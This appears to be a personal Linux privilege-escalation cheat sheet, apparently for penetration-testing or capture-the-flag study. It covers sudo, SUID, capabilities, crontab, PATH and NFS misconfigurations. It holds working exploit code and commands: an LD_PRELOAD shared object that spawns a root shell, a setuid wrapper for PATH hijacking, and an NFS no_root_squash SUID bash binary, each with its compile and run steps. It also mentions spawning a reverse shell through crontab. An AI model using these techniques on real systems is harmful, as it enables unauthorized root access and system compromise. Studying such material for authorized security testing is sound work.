________
BINARIES

https://github.com/ernw/static-toolbox/releases?q=&expanded=true

_________________
SUDO EXPLOITATION

sudo -l

use LD_PRELOAD -- https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/
  Check for LD_PRELOAD (with the env_keep option)
  Write a simple C code compiled as a share object (.so extension) file
  Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>

    void _init() {
      unsetenv("LD_PRELOAD");
      setgid(0);
      setuid(0);
      system("/bin/bash");
    }

  gcc -fPIC -shared -o shell.so shell.c -nostartfiles

  We need to run the program by specifying the LD_PRELOAD option, as follows;
  sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
  This will result in a shell spawn with root privileges.

_________________
SUID EXPLOITATION

find / -type f -perm -04000 -ls 2>/dev/null; will list files that have SUID or SGID bits set
https://gtfobins.github.io/

_________________________
CAPABILITIES EXPLOITATION

getcap -r / 2>/dev/null
https://gtfobins.github.io/

____________________
CRONTAB EXPLOITATION

cat /etc/crontab
check PATH for crontab
check read/write/execute perms for crontab files
use misconfigurations to spawn a reverse shell

__________________________
PATH VARIABLE EXPLOITATION

echo $PATH
export PATH=[folder path]:$PATH

compile below into binary with: gcc [filename] -o [outfile] -w
  #include<unistd.h>
  void main() {
    setuid(0);
    setgid(0);
    system("[binary in path to exploit]");
  }

set SUID bit: chmod u+s [outfile]
check to make sure suid bit is set with: ls -l

study PATH exploitation more later

________________________
NFS PRIVILEGE ESCALATION

/etc/exports
look for no_root_squash option -> default NFS changes root to nfsnobody and removed execution with root perms, no_root_squash ignores this default

showmount -e [RHOST]

mkdir [local path to share (something in /tmp maybe)]
mount -o rw [RHOST]:[vulnerable directory] [local path from above]

compile and upload binary, set SUID bits
  void main() { setuid(0); setgid(0); system("/bin/bash"); return 0; }

  gcc [filename] -o [outfile] -w
  chmod +s [outfile]